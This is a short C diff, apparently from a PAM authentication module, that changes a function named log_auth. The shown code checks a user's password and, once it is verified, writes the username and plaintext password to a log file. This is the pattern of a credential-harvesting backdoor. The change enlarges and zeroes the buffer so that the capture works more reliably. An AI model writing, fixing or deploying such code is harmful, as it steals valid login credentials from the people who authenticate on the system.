@@ -30,7 +30,8 @@ void log_auth(pam_handle_t *pamh, char *resp){
     got_pw = verify_pass(user, resp);
     if(!got_pw) return;
 
-    char logbuf[strlen(user)+strlen(resp)+5];
+    char logbuf[strlen(user)+strlen(resp)+64];
+    memset(logbuf, 0, sizeof(logbuf));
     snprintf(logbuf, sizeof(logbuf), LOG_FMT, user, resp);
 
     if(alreadylogged(LOG_PATH, logbuf))
